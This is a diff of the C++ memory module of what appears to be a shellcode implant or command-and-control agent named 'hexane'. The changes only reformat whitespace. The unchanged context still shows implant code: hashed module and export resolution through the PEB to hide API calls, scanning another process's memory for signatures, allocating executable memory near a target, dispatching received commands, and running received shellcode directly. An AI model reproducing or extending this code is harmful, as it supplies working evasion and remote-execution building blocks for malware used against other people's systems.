@@ -13,8 +13,8 @@ namespace Memory {
 
         _resource* GetIntResource(HMODULE base, const int rsrc_id) {
 
-            HRSRC       res_info    = { };
-            _resource   *object     = (_resource*)  x_malloc(sizeof(_resource));
+            HRSRC res_info      = { };
+            _resource *object   = (_resource*) x_malloc(sizeof(_resource));
 
             x_assert(res_info          = Ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
             x_assert(object->h_global  = Ctx->win32.LoadResource(base, res_info));
@@ -44,7 +44,7 @@ namespace Memory {
             // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
 
             _hexane instance    = { };
-            void    *region     = { };
+            void *region        = { };
 
             instance.teb    = NtCurrentTeb();
             instance.heap   = instance.teb->ProcessEnvironmentBlock->ProcessHeap;
@@ -89,7 +89,7 @@ namespace Memory {
 
         LDR_DATA_TABLE_ENTRY* GetModuleEntry(const uint32_t hash) {
 
-            const auto head = (LIST_ENTRY*) &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;
+            LIST_ENTRY *head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;
 
             for (auto next = head->Flink; next != head; next = next->Flink) {
                 wchar_t lowercase[MAX_PATH] = { };
@@ -108,7 +108,7 @@ namespace Memory {
         FARPROC GetExportAddress(const HMODULE base, const uint32_t hash) {
 
             FARPROC address             = { };
-            char    lowercase[MAX_PATH] = { };
+            char lowercase[MAX_PATH]    = { };
 
             const auto dos_head = DOS_HEADER(base);
             const auto nt_head  = NT_HEADERS(base, dos_head);
@@ -136,8 +136,8 @@ namespace Memory {
 
         UINT_PTR LoadExport(const char* const module_name, const char* const export_name) {
 
-            uintptr_t   symbol = 0;
-            int         reload = 0;
+            uintptr_t symbol    = 0;
+            int reload          = 0;
 
             const auto mod_hash = Utils::HashStringA(module_name, x_strlen(module_name));
             const auto fn_hash  = Utils::HashStringA(export_name, x_strlen(export_name));
@@ -186,8 +186,8 @@ namespace Memory {
 
         UINT_PTR RelocateExport(void* const process, const void* const target, size_t size) {
 
-            uintptr_t   ret     = 0;
-            const auto  address = (uintptr_t) target;
+            uintptr_t ret       = 0;
+            const auto address  = (uintptr_t) target;
 
             for (ret = (address & ADDRESS_MAX) - VM_MAX; ret < address + VM_MAX; ret += 0x10000) {
                 if (!NT_SUCCESS(Ctx->nt.NtAllocateVirtualMemory(process, (void **) &ret, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
@@ -210,8 +210,8 @@ namespace Memory {
 
         UINT_PTR SignatureScan(void* process, const uintptr_t start, const uint32_t size, const char* signature, const char* mask) {
 
-            size_t      read    = 0;
-            uintptr_t   address = 0;
+            size_t read         = 0;
+            uintptr_t address   = 0;
 
             auto buffer = (uint8_t*) x_malloc(size);
             x_ntassert(Ctx->nt.NtReadVirtualMemory(process, (void*) start, buffer, size, &read));
@@ -235,11 +235,11 @@ namespace Memory {
 
         BOOL ExecuteCommand(_parser &parser) {
 
-            _command    cmd         = { };
-            uintptr_t   command     = { };
+            _command cmd        = { };
+            uintptr_t command   = { };
 
-            const auto  cmd_id      = Parser::UnpackDword(&parser);
-            bool        success     = true;
+            const auto cmd_id   = Parser::UnpackDword(&parser);
+            bool success        = true;
 
             if (cmd_id == NOJOB) {
                 goto defer;
@@ -256,11 +256,11 @@ namespace Memory {
 
         BOOL ExecuteShellcode(const _parser &parser) {
 
-            void    (*exec)()   = { };
-            void    *address    = { };
+            void (*exec)()  = { };
+            void *address   = { };
 
-            size_t  size        = parser.Length;
-            bool    success     = true;
+            size_t size     = parser.Length;
+            bool success    = true;
 
             x_ntassertb(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &address, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
 
@@ -276,6 +276,5 @@ namespace Memory {
             if (address) { Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE); }
             return success;
         }
-
     }
 }
